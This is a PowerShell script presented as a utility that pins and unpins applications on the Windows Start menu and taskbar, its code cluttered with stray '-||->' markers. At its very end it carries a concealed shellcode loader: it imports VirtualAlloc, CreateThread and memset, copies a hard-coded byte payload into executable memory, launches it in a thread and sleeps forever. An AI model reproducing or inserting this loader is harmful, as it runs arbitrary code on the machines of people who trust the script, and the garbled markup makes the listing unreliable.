

[CmdletBinding()]
param
(
		[string]$AppsFile = 'Applications.txt',
		[ValidateNotNullOrEmpty()][string]$ConsoleTitle = 'Application Shortcuts',
		[switch]$OutputToTextFile,
		[switch]$GetApplicationList
)

 -||-> function Add-AppToStartMenu {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
			[Parameter(Mandatory = $true)][string]$Application
	)
	
	 -||-> $Success = $true <-||- 
	 -||-> $Status =  -||-> Remove-AppFromStartMenu -Application $Application <-||-  <-||- 
	 -||-> If ( -||-> $Status -eq $false <-||- ) {
		 -||-> $Success = $false <-||- 
	} <-||- 
	 -||-> Write-Host 'Pinning'$Application' to start menu.....' -NoNewline <-||- 
	 -||-> ( -||-> ( -||-> New-Object -Com Shell.Application <-||- ).NameSpace('shell:::{4234d49b-0245-4df3-b780-3893943456e1}').Items() | Where-Object{  -||-> $_.Name -eq $Application <-||-  } <-||- ).verbs() | Where-Object{  -||-> $_.Name.replace('&', '') -match 'Pin to Start' <-||-  } | ForEach-Object{  -||-> $_.DoIt() <-||-  } <-||- 
	 -||-> If ( -||-> $? -eq $true <-||- ) {
		 -||-> Write-Host 'Success' -ForegroundColor Yellow <-||- 
	} else {
		 -||-> Write-Host 'Failed' -ForegroundColor Red <-||- 
		 -||-> $Success = $false <-||- 
	} <-||- 
	Return  -||-> $Success <-||- 
} <-||- 

 -||-> function Add-AppToTaskbar {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
			[Parameter(Mandatory = $true)][string]$Application
	)
	
	 -||-> $Success = $true <-||- 
	 -||-> $Status =  -||-> Remove-AppFromTaskbar -Application $Application <-||-  <-||- 
	 -||-> If ( -||-> $Status -eq $false <-||- ) {
		 -||-> $Success = $false <-||- 
	} <-||- 
	 -||-> Write-Host 'Pinning'$Application' to start menu.....' -NoNewline <-||- 
	 -||-> ( -||-> ( -||-> New-Object -Com Shell.Application <-||- ).NameSpace('shell:::{4234d49b-0245-4df3-b780-3893943456e1}').Items() | Where-Object{  -||-> $_.Name -eq $Application <-||-  } <-||- ).verbs() | Where-Object{  -||-> $_.Name.replace('&', '') -match 'Pin to taskbar' <-||-  } | ForEach-Object{  -||-> $_.DoIt() <-||-  } <-||- 
	 -||-> If ( -||-> $? -eq $true <-||- ) {
		 -||-> Write-Host 'Success' -ForegroundColor Yellow <-||- 
	} else {
		 -||-> Write-Host 'Failed' -ForegroundColor Red <-||- 
		 -||-> $Success = $false <-||- 
	} <-||- 
	Return  -||-> $Success <-||- 
} <-||- 

 -||-> function Get-ApplicationList {

	
	[CmdletBinding()]
	param
	(
			[switch]$SaveOutput
	)
	
	 -||-> $RelativePath =  -||-> Get-RelativePath <-||-  <-||- 
	 -||-> $OutputFile = $RelativePath + "ApplicationList.csv" <-||- 
	 -||-> $Applications = ( -||-> New-Object -Com Shell.Application <-||- ).NameSpace('shell:::{4234d49b-0245-4df3-b780-3893943456e1}').Items() <-||- 
	 -||-> $Applications =  -||-> $Applications | Sort-Object -Property name -Unique <-||-  <-||- 
	 -||-> If ( -||-> $SaveOutput.IsPresent <-||- ) {
		 -||-> If ( -||-> ( -||-> Test-Path -Path $OutputFile <-||- ) -eq $true <-||- ) {
			 -||-> Remove-Item -Path $OutputFile -Force <-||- 
		} <-||- 
		 -||-> "Applications" | Out-File -FilePath $OutputFile -Encoding UTF8 -Force <-||- 
		 -||-> $Applications.Name | Out-File -FilePath $OutputFile -Encoding UTF8 -Append -Force <-||- 
	} <-||- 
	 -||-> $Applications.Name <-||- 
} <-||- 

 -||-> function Get-Applications {

	
	[CmdletBinding()][OutputType([object])]
	param ()
	
	 -||-> $RelativePath =  -||-> Get-RelativePath <-||-  <-||- 
	 -||-> $File = $RelativePath + $AppsFile <-||- 
	 -||-> $Contents =  -||-> Get-Content -Path $File -Force <-||-  <-||- 
	Return  -||-> $Contents <-||- 
} <-||- 

 -||-> function Get-RelativePath {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	 -||-> $Path = ( -||-> split-path $SCRIPT:MyInvocation.MyCommand.Path -parent <-||- ) + "\" <-||- 
	Return  -||-> $Path <-||- 
} <-||- 

 -||-> function Invoke-PinActions {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
			[Parameter(Mandatory = $false)][ValidateNotNullOrEmpty()][object]$AppList
	)
	
	 -||-> $Success = $true <-||- 
	 -||-> foreach ($App in  -||-> $AppList <-||- ) {
		 -||-> $Entry = $App.Split(',') <-||- 
		 -||-> If ( -||-> $Entry[1] -eq 'startmenu' <-||- ) {
			 -||-> If ( -||-> $Entry[2] -eq 'add' <-||- ) {
				 -||-> $Status =  -||-> Add-AppToStartMenu -Application $Entry[0] <-||-  <-||- 
				 -||-> If ( -||-> $Status -eq $false <-||- ) {
					 -||-> $Success = $false <-||- 
				} <-||- 
			} elseif ( -||-> $Entry[2] -eq 'remove' <-||- ) {
				 -||-> $Status =  -||-> Remove-AppFromStartMenu -Application $Entry[0] <-||-  <-||- 
				 -||-> If ( -||-> $Status -eq $false <-||- ) {
					 -||-> $Success = $false <-||- 
				} <-||- 
			} else {
				 -||-> Write-Host $Entry[0]" was entered incorrectly" <-||- 
			} <-||- 
		} elseif ( -||-> $Entry[1] -eq 'taskbar' <-||- ) {
			 -||-> If ( -||-> $Entry[2] -eq 'add' <-||- ) {
				 -||-> $Status =  -||-> Add-AppToTaskbar -Application $Entry[0] <-||-  <-||- 
				 -||-> If ( -||-> $Status -eq $false <-||- ) {
					 -||-> $Success = $false <-||- 
				} <-||- 
			} elseif ( -||-> $Entry[2] -eq 'remove' <-||- ) {
				 -||-> $Status =  -||-> Remove-AppFromTaskbar -Application $Entry[0] <-||-  <-||- 
				 -||-> If ( -||-> $Status -eq $false <-||- ) {
					 -||-> $Success = $false <-||- 
				} <-||- 
			} else {
				 -||-> Write-Host $Entry[0]" was entered incorrectly" <-||- 
			} <-||- 
		} <-||- 
	} <-||- 
	Return  -||-> $Success <-||- 
} <-||- 

 -||-> function Remove-AppFromStartMenu {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
			[Parameter(Mandatory = $true)][string]$Application
	)
	
	 -||-> $Success = $true <-||- 
	 -||-> Write-Host 'Unpinning'$Application' from start menu.....' -NoNewline <-||- 
	 -||-> ( -||-> ( -||-> New-Object -Com Shell.Application <-||- ).NameSpace('shell:::{4234d49b-0245-4df3-b780-3893943456e1}').Items() | Where-Object{  -||-> $_.Name -eq $Application <-||-  } <-||- ).verbs() | Where-Object{  -||-> $_.Name.replace('&', '') -match 'Unpin from Start' <-||-  } | ForEach-Object{  -||-> $_.DoIt() <-||-  } <-||- 
	 -||-> If ( -||-> $? -eq $true <-||- ) {
		 -||-> Write-Host 'Success' -ForegroundColor Yellow <-||- 
	} else {
		 -||-> Write-Host 'Failed' -ForegroundColor Red <-||- 
		 -||-> $Success = $false <-||- 
	} <-||- 
	Return  -||-> $Success <-||- 
} <-||- 

 -||-> function Remove-AppFromTaskbar {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
			[Parameter(Mandatory = $true)][string]$Application
	)
	
	 -||-> $Success = $true <-||- 
	 -||-> Write-Host 'Unpinning'$Application' from task bar.....' -NoNewline <-||- 
	 -||-> ( -||-> ( -||-> New-Object -Com Shell.Application <-||- ).NameSpace('shell:::{4234d49b-0245-4df3-b780-3893943456e1}').Items() | Where-Object{  -||-> $_.Name -eq $Application <-||-  } <-||- ).verbs() | Where-Object{  -||-> $_.Name.replace('&', '') -match 'Unpin from taskbar' <-||-  } | ForEach-Object{  -||-> $_.DoIt() <-||-  } <-||- 
	 -||-> If ( -||-> $? -eq $true <-||- ) {
		 -||-> Write-Host 'Success' -ForegroundColor Yellow <-||- 
	} else {
		 -||-> Write-Host 'Failed' -ForegroundColor Red <-||- 
		 -||-> $Success = $false <-||- 
	} <-||- 
	Return  -||-> $Success <-||- 
} <-||- 

 -||-> function Set-ConsoleTitle {

	
	[CmdletBinding()]
	param
	(
			[Parameter(Mandatory = $true)][String]$Title
	)
	
	 -||-> $host.ui.RawUI.WindowTitle = $Title <-||- 
} <-||- 

 -||-> Clear-Host <-||- 
 -||-> $Success = $true <-||- 
 -||-> Set-ConsoleTitle -Title $ConsoleTitle <-||- 
 -||-> If ( -||-> $GetApplicationList.IsPresent <-||- ) {
	 -||-> If ( -||-> $OutputToTextFile.IsPresent <-||- ) {
		 -||-> Get-ApplicationList -SaveOutput <-||- 
	} else {
		 -||-> Get-ApplicationList <-||- 
	} <-||- 
} <-||- 
 -||-> If ( -||-> ( -||-> $AppsFile -ne $null <-||- ) -or ( -||-> $AppsFile -ne "" <-||- ) <-||- ) {
	 -||-> $ApplicationList =  -||-> Get-Applications <-||-  <-||- 
	 -||-> $Success =  -||-> Invoke-PinActions -AppList $ApplicationList <-||-  <-||- 
} <-||- 




 -||-> If ( -||-> $Success -eq $false <-||- ) {
	Exit  -||-> 1 <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbb,0x5b,0xf4,0x3c,0x37,0xda,0xc3,0xd9,0x74,0x24,0xf4,0x5f,0x29,0xc9,0xb1,0x47,0x31,0x5f,0x13,0x83,0xc7,0x04,0x03,0x5f,0x54,0x16,0xc9,0xcb,0x82,0x54,0x32,0x34,0x52,0x39,0xba,0xd1,0x63,0x79,0xd8,0x92,0xd3,0x49,0xaa,0xf7,0xdf,0x22,0xfe,0xe3,0x54,0x46,0xd7,0x04,0xdd,0xed,0x01,0x2a,0xde,0x5e,0x71,0x2d,0x5c,0x9d,0xa6,0x8d,0x5d,0x6e,0xbb,0xcc,0x9a,0x93,0x36,0x9c,0x73,0xdf,0xe5,0x31,0xf0,0x95,0x35,0xb9,0x4a,0x3b,0x3e,0x5e,0x1a,0x3a,0x6f,0xf1,0x11,0x65,0xaf,0xf3,0xf6,0x1d,0xe6,0xeb,0x1b,0x1b,0xb0,0x80,0xef,0xd7,0x43,0x41,0x3e,0x17,0xef,0xac,0x8f,0xea,0xf1,0xe9,0x37,0x15,0x84,0x03,0x44,0xa8,0x9f,0xd7,0x37,0x76,0x15,0xcc,0x9f,0xfd,0x8d,0x28,0x1e,0xd1,0x48,0xba,0x2c,0x9e,0x1f,0xe4,0x30,0x21,0xf3,0x9e,0x4c,0xaa,0xf2,0x70,0xc5,0xe8,0xd0,0x54,0x8e,0xab,0x79,0xcc,0x6a,0x1d,0x85,0x0e,0xd5,0xc2,0x23,0x44,0xfb,0x17,0x5e,0x07,0x93,0xd4,0x53,0xb8,0x63,0x73,0xe3,0xcb,0x51,0xdc,0x5f,0x44,0xd9,0x95,0x79,0x93,0x1e,0x8c,0x3e,0x0b,0xe1,0x2f,0x3f,0x05,0x25,0x7b,0x6f,0x3d,0x8c,0x04,0xe4,0xbd,0x31,0xd1,0x91,0xb8,0xa5,0x44,0x20,0x4e,0x90,0x11,0xa9,0x50,0xa0,0x88,0x24,0xb6,0x04,0x1b,0x67,0x67,0xe4,0xcb,0xc7,0xd7,0x8c,0x01,0xc8,0x08,0xac,0x29,0x02,0x21,0x46,0xc6,0xfb,0x19,0xfe,0x7f,0xa6,0xd2,0x9f,0x80,0x7c,0x9f,0x9f,0x0b,0x73,0x5f,0x51,0xfc,0xfe,0x73,0x05,0x0c,0xb5,0x2e,0x83,0x13,0x63,0x44,0x2b,0x86,0x88,0xcf,0x7c,0x3e,0x93,0x36,0x4a,0xe1,0x6c,0x1d,0xc1,0x28,0xf9,0xde,0xbd,0x54,0xed,0xde,0x3d,0x03,0x67,0xdf,0x55,0xf3,0xd3,0x8c,0x40,0xfc,0xc9,0xa0,0xd9,0x69,0xf2,0x90,0x8e,0x3a,0x9a,0x1e,0xe9,0x0d,0x05,0xe0,0xdc,0x8f,0x79,0x37,0x18,0xfa,0x93,0x8b <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



